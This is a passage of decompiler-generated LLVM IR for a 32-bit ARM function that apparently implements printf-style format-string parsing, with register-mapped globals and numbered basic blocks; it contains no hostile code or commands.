  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_d714, i32* %r0.global-to-local, align 4
  %v0_d720 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_d720, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_d728 = call i32 @function_dd00(i32* nonnull %stack_var_-332)
  store i32 %v2_d728, i32* %r0.global-to-local, align 4
  %v1_d72c = icmp slt i32 %v2_d728, 0
  br i1 %v1_d72c, label %dec_label_pc_d734, label %dec_label_pc_d768

dec_label_pc_d734:                                ; preds = %dec_label_pc_d70c
  %v3_d734 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_d734, i32* @r4, align 4
  store i32 %v3_d734, i32* @r0, align 4
  %v0_d73c = call i32 @function_ecc0()
  store i32 %v0_d73c, i32* %r0.global-to-local, align 4
  %v2_d740 = icmp eq i32 %v0_d73c, 0
  br i1 %v2_d740, label %bb, label %dec_label_pc_d750

bb:                                               ; preds = %dec_label_pc_d734
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dce0

dec_label_pc_d750:                                ; preds = %dec_label_pc_d734
  %v0_d750 = load i32, i32* @r4, align 4
  store i32 %v0_d750, i32* %r0.global-to-local, align 4
  %v0_d754 = load i32, i32* @fp, align 4
  store i32 %v0_d754, i32* %r2.global-to-local, align 4
  %v3_d758 = call i32 @function_11230(i32 %v0_d750, i32 %v0_d73c, i32 %v0_d754)
  store i32 %v3_d758, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dce0

dec_label_pc_d768:                                ; preds = %dec_label_pc_d70c
  store i32 %v2_d714, i32* %r0.global-to-local, align 4
  %v0_d76c = load i32, i32* @r5, align 4
  %v2_d770 = call i32 @function_dd98(i32 %v2_d714, i32 %v0_d76c)
  store i32 %v2_d770, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v4_d810 = zext i8 %tmp104 to i32
  %v2_d818 = ptrtoint i32* %stack_var_-252 to i32
  %v2_d838 = ptrtoint i32* %stack_var_-36 to i32
  %v2_d850 = icmp eq i32 %tmp102, 0
  %v1_d864 = inttoptr i32 %tmp101 to i32*
  %v2_db54 = ptrtoint i32* %stack_var_-180 to i32
  %v2_da70 = ptrtoint i32* %stack_var_-44 to i32
  %v2_da84 = ptrtoint i32* %stack_var_-52 to i32
  %v3_da20 = add i32 %tmp101, 4
  %v4_da20 = inttoptr i32 %v3_da20 to i32*
  %v2_da24 = ptrtoint i32* %stack_var_-328 to i32
  %v7_d8e4 = zext i8 %tmp99 to i32
  %v2_d920 = ptrtoint i32* %stack_var_-53 to i32
  %v5_d928 = bitcast i32* %stack_var_-53 to i8*
  %v2_d930 = icmp ugt i32 %tmp102, 4
  %v7_d930 = icmp eq i32 %tmp102, 5
  %v0_dcc8.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_d848187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_da44 = icmp ugt i32 %tmp102, 16
  %v7_da44 = icmp eq i32 %tmp102, 17
  %v2_da48 = xor i1 %v7_da44, true
  %v3_da48 = and i1 %v2_da44, %v2_da48
  %v2_dae4 = icmp ugt i32 %tmp102, 18
  %v7_dae4 = icmp eq i32 %tmp102, 19
  %v2_dae8 = xor i1 %v7_dae4, true
  %v3_dae8 = and i1 %v2_dae4, %v2_dae8
  %v7_db48 = icmp eq i32 %tmp102, 20
  %v2_d888 = add i32 %tmp102, ptrtoint (i32* @global_var_16988.331 to i32)
  %v1_d88c = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_16988.331 to i32), i32 -1)
  %v2_d88c = inttoptr i32 %v1_d88c to i8*
  %v2_d8b8 = xor i1 %v7_d930, true
  %v3_d8b8 = and i1 %v2_d930, %v2_d8b8
  %v7_d8ec = icmp eq i32 %tmp102, 1
  %v2_d938 = xor i1 %v2_d930, true
  %v3_d938 = or i1 %v7_d930, %v2_d938
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_d9a0 = icmp eq i32 %tmp102, 3
  %v11_d9ac = icmp eq i32 %tmp102, 4
  %v9_d81c = mul nuw nsw i32 %v4_d810, 8
  %v10_d81c = add nsw i32 %v9_d81c, -8
  %v6_d824 = add i32 %v10_d81c, %v2_d818
  br label %dec_label_pc_dcc8

bb126:                                            ; preds = %dec_label_pc_d780.outer, %.thread7
  %v2_d780185 = phi i8 [ %v2_d780, %.thread7 ], [ %v2_d780181, %dec_label_pc_d780.outer ]
  %v1_d794184 = phi i32 [ %v2_d794, %.thread7 ], [ %v0_d78049, %dec_label_pc_d780.outer ]
  %v8_d788 = icmp eq i8 %v2_d780185, 37
  br i1 %v8_d788, label %dec_label_pc_d79c, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_d794 = add i32 %v1_d794184, 1
  store i32 %v2_d794, i32* @r4, align 4
  %v1_d780 = inttoptr i32 %v2_d794 to i8*
  %v2_d780 = load i8, i8* %v1_d780, align 1
  %v3_d780 = zext i8 %v2_d780 to i32
  store i32 %v3_d780, i32* %r3.global-to-local, align 4
  %v2_d784 = icmp eq i8 %v2_d780, 0
  br i1 %v2_d784, label %dec_label_pc_d79c, label %bb126

dec_label_pc_d79c:                                ; preds = %bb126, %.thread7, %dec_label_pc_d780.outer
  %v1_d794.lcssa = phi i32 [ %v0_d78049, %dec_label_pc_d780.outer ], [ %v2_d794, %.thread7 ], [ %v1_d794184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d79c = sub i32 %v1_d794.lcssa, %v5_d7ac
  %v9_d79c = icmp eq i32 %v1_d794.lcssa, %v5_d7ac
  br i1 %v9_d79c, label %dec_label_pc_d7d0, label %dec_label_pc_d7a4

dec_label_pc_d7a4:                                ; preds = %dec_label_pc_d79c
  store i32 %v2_d79c, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_d79c, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_d7a4
  store i32 %v5_d7ac, i32* %r0.global-to-local, align 4
  %v5_d7b4 = load i32, i32* @fp, align 4
  store i32 %v5_d7b4, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_d7a4, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_d7a4 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_11230.329 to i32))
  %v0_d7bc = load i32, i32* %r0.global-to-local, align 4
  %v1_d7bc = load i32, i32* @r5, align 4
  %v9_d7bc = icmp eq i32 %v0_d7bc, %v1_d7bc
  br i1 %v9_d7bc, label %dec_label_pc_d7c4, label %dec_label_pc_dcd8

dec_label_pc_d7c4:                                ; preds = %bb130
  %v2_d7c8 = add i32 %v0_d7bc, %stack_var_-336.1.ph
  store i32 %v2_d7c8, i32* @lr, align 4
  %v0_d7d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d7d0

dec_label_pc_d7d0:                                ; preds = %dec_label_pc_d79c, %dec_label_pc_d7c4
  %v0_d7e4 = phi i32 [ %v5_d7ac, %dec_label_pc_d79c ], [ %v0_d7d0.pre, %dec_label_pc_d7c4 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_d79c ], [ %v2_d7c8, %dec_label_pc_d7c4 ]
  %v1_d7d0 = inttoptr i32 %v0_d7e4 to i8*
  %v2_d7d0 = load i8, i8* %v1_d7d0, align 1
  %v3_d7d0 = zext i8 %v2_d7d0 to i32
  store i32 %v3_d7d0, i32* %r3.global-to-local, align 4
  %v2_d7d4 = icmp eq i8 %v2_d7d0, 0
  br i1 %v2_d7d4, label %dec_label_pc_dce0, label %dec_label_pc_d7dc

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d7d0
  %v1_d7dc = add i32 %v0_d7e4, 1
  %v2_d7dc = inttoptr i32 %v1_d7dc to i8*
  %v3_d7dc = load i8, i8* %v2_d7dc, align 1
  %v4_d7dc = zext i8 %v3_d7dc to i32
  store i32 %v4_d7dc, i32* %r3.global-to-local, align 4
  %v7_d7e0 = icmp eq i8 %v3_d7dc, 37
  store i32 %v1_d7dc, i32* %r2.global-to-local, align 4
  br i1 %v7_d7e0, label %dec_label_pc_dcd0, label %dec_label_pc_d7ec

dec_label_pc_d7ec:                                ; preds = %dec_label_pc_d7dc
  store i32 %v2_d714, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d714, i32* %r0.global-to-local, align 4
  store i32 %v1_d7dc, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d800 = call i32 @function_dfb8(i32* nonnull %stack_var_-332)
  store i32 %v2_d714, i32* @r0, align 4
  %v0_d808 = call i32 @function_ddd0()
  store i32 %v0_d808, i32* %r0.global-to-local, align 4
  store i32 %v4_d810, i32* @ip, align 4
  store i32 %v2_d818, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_d7ec
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_d7ec
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_d824, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_d83078 = phi i32 [ %v6_d824, %bb133 ], [ %v2_d818, %.thread ]
  store i32 %v2_d838, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_d848187, label %dec_label_pc_d830, label %dec_label_pc_d84c

dec_label_pc_d830:                                ; preds = %bb134, %dec_label_pc_d830
  %v5_d840189 = phi i32 [ %v5_d840, %dec_label_pc_d830 ], [ %v2_d838, %bb134 ]
  %v0_d830188 = phi i32 [ %v1_d834, %dec_label_pc_d830 ], [ %v0_d83078, %bb134 ]
  %v2_d830 = add i32 %v5_d840189, -4
  %v3_d830 = inttoptr i32 %v2_d830 to i32*
  store i32 %v0_d830188, i32* %v3_d830, align 4
  %v0_d834 = load i32, i32* %r3.global-to-local, align 4
  %v1_d834 = add i32 %v0_d834, 8
  store i32 %v1_d834, i32* %r3.global-to-local, align 4
  %v0_d83c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d83c.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_d838, i32* @lr, align 4
  %v4_d840 = mul i32 %v0_d83c.pre, 4
  %v5_d840 = add i32 %v4_d840, %v2_d838
  %v1_d844 = add i32 %v0_d83c.pre, 1
  store i32 %v1_d844, i32* %r2.global-to-local, align 4
  %v5_d848 = icmp slt i32 %v0_d83c.pre, %v1_d83c.pre
  br i1 %v5_d848, label %dec_label_pc_d830, label %dec_label_pc_d84c

dec_label_pc_d84c:                                ; preds = %dec_label_pc_d830, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_d850, label %dec_label_pc_d858, label %dec_label_pc_d87c

dec_label_pc_d858:                                ; preds = %dec_label_pc_d84c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* @ip, align 4
  %v2_d864 = load i32, i32* %v1_d864, align 4
  store i32 %v2_d864, i32* %r0.global-to-local, align 4
  %v1_d868 = and i32 %v0_d8ac, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_d870 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_d870, i32* %r3.global-to-local, align 4
  %v4_d874 = inttoptr i32 %v2_d864 to i8*
  %v5_d874 = call i32 @function_114dc(i8* %v4_d874, i32 %v1_d868, i32 %stack_var_-336.2, i32 %v3_d870)
  store i32 %v5_d874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dcc4

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d84c
  br i1 %tmp195, label %dec_label_pc_da08, label %dec_label_pc_d884

dec_label_pc_d884:                                ; preds = %dec_label_pc_d87c
  store i32 %v2_d888, i32* %r3.global-to-local, align 4
  %v3_d88c = load i8, i8* %v2_d88c, align 1
  %v4_d88c = zext i8 %v3_d88c to i32
  store i32 %v4_d88c, i32* @r4, align 4
  %v7_d890 = icmp eq i8 %v3_d88c, 10
  br i1 %v7_d890, label %dec_label_pc_d89c, label %bb135

bb135:                                            ; preds = %dec_label_pc_d884
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d884
  store i32 %v0_d8ac, i32* %r3.global-to-local, align 4
  %v1_d8a0 = and i32 %v0_d8ac, 32
  %v2_d8a0 = icmp eq i32 %v1_d8a0, 0
  %.175 = select i1 %v2_d8a0, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_d8ac = and i32 %v0_d8ac, 64
  %v2_d8ac = icmp eq i32 %v1_d8ac, 0
  br i1 %v2_d8ac, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_d89c
  %.176 = select i1 %v2_d8a0, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_d89c, %bb138
  br i1 %v3_d8b8, label %.thread84, label %dec_label_pc_d8c0

.thread84:                                        ; preds = %bb139
  %v5_d8b8 = sub nsw i32 0, %v4_d88c
  store i32 %v5_d8b8, i32* @r4, align 4
  br label %dec_label_pc_d8d8

dec_label_pc_d8c0:                                ; preds = %bb139
  br i1 %v7_d9a0, label %bb140, label %dec_label_pc_d8cc

bb140:                                            ; preds = %dec_label_pc_d8c0
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_d8d8

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d8c0
  br i1 %v7_d8ec, label %dec_label_pc_d8dc, label %dec_label_pc_d8d8

dec_label_pc_d8d8:                                ; preds = %.thread84, %bb140, %dec_label_pc_d8cc
  %v0_d90486 = phi i32 [ %v5_d8b8, %.thread84 ], [ %v4_d88c, %bb140 ], [ %v4_d88c, %dec_label_pc_d8cc ]
  br label %dec_label_pc_d8dc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8cc, %dec_label_pc_d8d8
  %v0_d90485 = phi i32 [ %v0_d90486, %dec_label_pc_d8d8 ], [ %v4_d88c, %dec_label_pc_d8cc ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_d8d8 ], [ 6, %dec_label_pc_d8cc ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_d8dc = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_d8dc, i32* %r3.global-to-local, align 4
  %v1_d8e0 = icmp slt i32 %v3_d8dc, 0
  %v7_d8e4. = select i1 %v1_d8e0, i32 %v7_d8e4, i32 32
  store i32 %v7_d8e4., i32* @sb, align 4
  br i1 %v7_d8ec, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_d8dc
  store i32 %v2_d838, i32* @lr, align 4
  %v2_d8f4 = load i32, i32* @ip, align 4
  %v5_d8f4 = mul i32 %v2_d8f4, 4
  %v6_d8f4 = add i32 %v5_d8f4, %v2_d838
  store i32 %v6_d8f4, i32* %r3.global-to-local, align 4
  %v2_d8f8 = add i32 %v6_d8f4, -260
  %v3_d8f8 = inttoptr i32 %v2_d8f8 to i32*
  %v4_d8f8 = load i32, i32* %v3_d8f8, align 4
  store i32 %v4_d8f8, i32* %r3.global-to-local, align 4
  %v2_d900 = and i32 %v4_d8f8, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_d8dc, %.thread16
  %storemerge94 = phi i32 [ %v2_d900, %.thread16 ], [ 1024, %dec_label_pc_d8dc ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_d90485, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_d90c = call i32 @function_1146c()
  %v0_d910 = load i32, i32* @r1, align 4
  store i32 %v0_d910, i32* %r2.global-to-local, align 4
  %v0_d91c = load i32, i32* @r4, align 4
  store i32 %v0_d91c, i32* %r3.global-to-local, align 4
  store i32 %v2_d920, i32* %r0.global-to-local, align 4
  %v0_d924 = load i32, i32* @r5, align 4
  %v6_d928 = call i32 @function_11510(i8* %v5_d928, i32 %v0_d90c, i32 %v0_d910, i32 %v0_d91c, i32 %v0_d924)
  store i32 %v6_d928, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_d928, i32* @r6, align 4
  br i1 %v3_d938, label %bb148, label %dec_label_pc_d93c

dec_label_pc_d93c:                                ; preds = %bb145
  %v7_d928 = inttoptr i32 %v6_d928 to i8*
  %v3_d93c = load i8, i8* %v7_d928, align 1
  %v7_d940 = icmp eq i8 %v3_d93c, 45
  %v2_d948 = or i32 %v0_d8ac, 2
  %v2_d948.stack_var_-316.4 = select i1 %v7_d940, i32 %v2_d948, i32 %v0_d8ac
  store i32 %v2_d948.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_d940, label %.thread18, label %dec_label_pc_d95c

.thread18:                                        ; preds = %dec_label_pc_d93c
  %v3_d94c = add i32 %v6_d928, 1
  store i32 %v3_d94c, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_d95c:                                ; preds = %dec_label_pc_d93c
  %v1_d95c = and i32 %v2_d948.stack_var_-316.4, 2
  %v2_d95c = icmp eq i32 %v1_d95c, 0
  br i1 %v2_d95c, label %dec_label_pc_d968, label %bb146

bb146:                                            ; preds = %dec_label_pc_d95c
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_d968:                                ; preds = %dec_label_pc_d95c
  %v1_d968 = urem i32 %v2_d948.stack_var_-316.4, 2
  %v2_d968 = icmp eq i32 %v1_d968, 0
  br i1 %v2_d968, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_d968
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_d968, %bb147
  %v0_d9c4 = phi i32 [ %v6_d928, %bb145 ], [ %v3_d94c, %.thread18 ], [ %v6_d928, %dec_label_pc_d968 ], [ %v6_d928, %bb147 ], [ %v6_d928, %bb146 ]
  %v0_d980 = phi i32 [ %v0_d8ac, %bb145 ], [ %v2_d948, %.thread18 ], [ %v0_d8ac, %dec_label_pc_d968 ], [ %v0_d8ac, %bb147 ], [ %v0_d8ac, %bb146 ]
  %v3_d970 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_d970, i32* %r2.global-to-local, align 4
  store i32 %v0_d980, i32* %r3.global-to-local, align 4
  %v1_d978 = icmp slt i32 %v3_d970, 0
  br i1 %v1_d978, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_d9a8 = phi i32 [ %v3_d970, %bb148 ], [ 1, %bb149 ]
  %v1_d980 = and i32 %v0_d980, 16
  %v2_d980 = icmp eq i32 %v1_d980, 0
  store i32 %v2_db54, i32* %r3.global-to-local, align 4
  %v2_d988 = sub i32 %v2_db54, %v0_d9c4
  %v1_d98c = add i32 %v2_d988, 127
  store i32 %v1_d98c, i32* @r5, align 4
  br i1 %v2_d980, label %bb157, label %dec_label_pc_d994

dec_label_pc_d994:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_d994
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_d994, %bb151
  br i1 %v7_d9a0, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_d9a8, %v1_d98c
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_d9ac, label %dec_label_pc_d9b4, label %bb157

dec_label_pc_d9b4:                                ; preds = %bb155
  %v1_d9b4 = inttoptr i32 %v0_d9c4 to i8*
  %v2_d9b4 = load i8, i8* %v1_d9b4, align 1
  %v3_d9b4 = zext i8 %v2_d9b4 to i32
  store i32 %v3_d9b4, i32* %r3.global-to-local, align 4
  %v7_d9b8 = icmp eq i8 %v2_d9b4, 48
  br i1 %v7_d9b8, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_d9b4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_d9b4
  %v2_d9c0 = add i32 %v2_d988, 128
  store i32 %v2_d9c0, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_d9fc = phi i32 [ %v0_d9a8, %bb155 ], [ %v0_d9a8, %bb150 ], [ 1, %bb156 ], [ %v2_d9c0, %.thread25 ], [ %v0_d9a8, %bb154 ]
  %v1_d9c4 = inttoptr i32 %v0_d9c4 to i8*
  %v2_d9c4 = load i8, i8* %v1_d9c4, align 1
  %v3_d9c4 = zext i8 %v2_d9c4 to i32
  store i32 %v3_d9c4, i32* %r3.global-to-local, align 4
  %v7_d9c8 = icmp eq i8 %v2_d9c4, 48
  br i1 %v7_d9c8, label %dec_label_pc_d9d0, label %dec_label_pc_d9f8

dec_label_pc_d9d0:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_d9d4 = load i32, i32* @r7, align 4
  %v7_d9d8 = icmp slt i32 %v0_d9d4, 6
  br i1 %v7_d9d8, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_d9d0
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_d9d0, %bb158
  br i1 %v7_d8ec, label %.thread26, label %dec_label_pc_d9ec

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1696c.333 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_db6c

dec_label_pc_d9ec:                                ; preds = %bb159
  %v2_d9ec = icmp eq i32 %v5_d9fc, 0
  br i1 %v2_d9ec, label %bb160, label %dec_label_pc_d9f8

bb160:                                            ; preds = %dec_label_pc_d9ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_db6c

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d9ec, %bb157
  %v2_d9f8 = sub i32 %v5_d9fc, %v1_d98c
  %tmp199 = icmp ugt i32 %v5_d9fc, %v1_d98c
  br i1 %tmp199, label %.thread90, label %dec_label_pc_db6c

.thread90:                                        ; preds = %dec_label_pc_d9f8
  store i32 %v2_d9f8, i32* @r4, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_da08:                                ; preds = %dec_label_pc_d87c
  br i1 %tmp196, label %dec_label_pc_da44, label %dec_label_pc_da10

dec_label_pc_da10:                                ; preds = %dec_label_pc_da08
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_da1c = load i32, i32* @fp, align 4
  store i32 %v0_da1c, i32* %r0.global-to-local, align 4
  %v2_da20 = load i32, i32* %v1_d864, align 4
  %v5_da20 = load i32, i32* %v4_da20, align 4
  store i32 %v5_da20, i32* %r2.global-to-local, align 4
  store i32 %v2_da24, i32* %r3.global-to-local, align 4
  %v6_da28 = call i32 @function_11660(i32 %v0_da1c, i32 %v2_da20, i32 %v5_da20, i32* nonnull %stack_var_-328, i32 54920)
  store i32 %v6_da28, i32* %r0.global-to-local, align 4
  %v1_da2c = icmp slt i32 %v6_da28, 0
  br i1 %v1_da2c, label %dec_label_pc_dcd8, label %dec_label_pc_da34

dec_label_pc_da34:                                ; preds = %dec_label_pc_da10
  %v2_da38 = add i32 %v6_da28, %stack_var_-336.2
  store i32 %v2_da38, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dcc4

dec_label_pc_da44:                                ; preds = %dec_label_pc_da08
  br i1 %v3_da48, label %dec_label_pc_dae4, label %dec_label_pc_da4c

dec_label_pc_da4c:                                ; preds = %dec_label_pc_da44
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_da44, label %dec_label_pc_da5c, label %dec_label_pc_daac

dec_label_pc_da5c:                                ; preds = %dec_label_pc_da4c
  %v2_da5c = load i32, i32* %v1_d864, align 4
  store i32 %v2_da5c, i32* %r3.global-to-local, align 4
  %v9_da60 = icmp eq i32 %v2_da5c, 0
  store i32 %v2_da5c, i32* %stack_var_-44, align 4
  br i1 %v9_da60, label %dec_label_pc_db74, label %dec_label_pc_da6c

dec_label_pc_da6c:                                ; preds = %dec_label_pc_da5c
  %v3_da6c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_da6c, i32* %r3.global-to-local, align 4
  store i32 %v2_da70, i32* @r0, align 4
  %v5_da7c = icmp slt i32 %v3_da6c, -1
  br i1 %v5_da7c, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_da6c
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_da6c, %bb161
  %storemerge193 = phi i32 [ %v3_da6c, %bb161 ], [ -1, %dec_label_pc_da6c ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_da70, i32* @r1, align 4
  store i32 %v2_da84, i32* %r3.global-to-local, align 4
  %v0_da88 = call i32 @function_11060()
  store i32 %v0_da88, i32* %r0.global-to-local, align 4
  %v7_da8c = icmp eq i32 %v0_da88, -1
  store i32 %v0_da88, i32* @r5, align 4
  br i1 %v7_da8c, label %dec_label_pc_dcd8, label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %bb162
  %v0_da98 = load i32, i32* @sl, align 4
  store i32 %v0_da98, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_da98, i32* @r6, align 4
  br label %dec_label_pc_db88

dec_label_pc_daac:                                ; preds = %dec_label_pc_da4c
  store i32 %v2_db54, i32* %r8.global-to-local, align 4
  %v2_dab0 = load i32, i32* %v1_d864, align 4
  store i32 %v2_da84, i32* %r2.global-to-local, align 4
  store i32 %v2_db54, i32* %r0.global-to-local, align 4
  %v3_dabc = call i32 @function_11010(i32 %v2_db54, i32 %v2_dab0, i32 %v2_da84)
  store i32 %v3_dabc, i32* %r0.global-to-local, align 4
  %v7_dac0 = icmp eq i32 %v3_dabc, -1
  store i32 %v3_dabc, i32* @r5, align 4
  br i1 %v7_dac0, label %dec_label_pc_dcd8, label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_daac
  %v0_dacc = load i32, i32* @sl, align 4
  store i32 %v0_dacc, i32* @r4, align 4
  store i32 %v2_db54, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_dadc = trunc i32 %v0_dacc to i8
  %v2_dadc = load i32, i32* %r8.global-to-local, align 4
  %v4_dadc = add i32 %v2_dadc, %v3_dabc
  %v5_dadc = inttoptr i32 %v4_dadc to i8*
  store i8 %v1_dadc, i8* %v5_dadc, align 1
  %v0_db8c.pre.pre = load i32, i32* @r5, align 4
  %v1_db8c.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_dae4:                                ; preds = %dec_label_pc_da44
  br i1 %v3_dae8, label %dec_label_pc_db48, label %dec_label_pc_daec

dec_label_pc_daec:                                ; preds = %dec_label_pc_dae4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_daf4 = load i32, i32* %v1_d864, align 4
  br i1 %v7_dae4, label %dec_label_pc_daf4, label %dec_label_pc_db20

dec_label_pc_daf4:                                ; preds = %dec_label_pc_daec
  store i32 %v2_daf4, i32* @r6, align 4
  %v2_daf8 = icmp eq i32 %v2_daf4, 0
  br i1 %v2_daf8, label %dec_label_pc_db74, label %dec_label_pc_db00

dec_label_pc_db00:                                ; preds = %dec_label_pc_daf4, %dec_label_pc_db50
  %v0_db10 = phi i32 [ %v2_daf4, %dec_label_pc_daf4 ], [ %v3_db60, %dec_label_pc_db50 ]
  %v3_db00 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_db00, i32* %r3.global-to-local, align 4
  %v5_db0c = icmp slt i32 %v3_db00, -1
  br i1 %v5_db0c, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_db00
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_db00, %bb163
  %storemerge194 = phi i32 [ %v3_db00, %bb163 ], [ -1, %dec_label_pc_db00 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_db10, i32* %r0.global-to-local, align 4
  %v1_db14 = inttoptr i32 %v0_db10 to i8*
  %v2_db14 = call i32 @function_ef18(i8* %v1_db14)
  store i32 %v2_db14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_db7c

dec_label_pc_db20:                                ; preds = %dec_label_pc_daec
  store i32 %v2_daf4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_db54, i32* @r6, align 4
  store i32 %v2_daf4, i32* %stack_var_-180, align 4
  br label %dec_label_pc_db88thread-pre-split

dec_label_pc_db48:                                ; preds = %dec_label_pc_dae4
  br i1 %v7_db48, label %dec_label_pc_db50, label %dec_label_pc_dcd8

dec_label_pc_db50:                                ; preds = %dec_label_pc_db48
  %v0_db50 = call i32 @function_cc08()
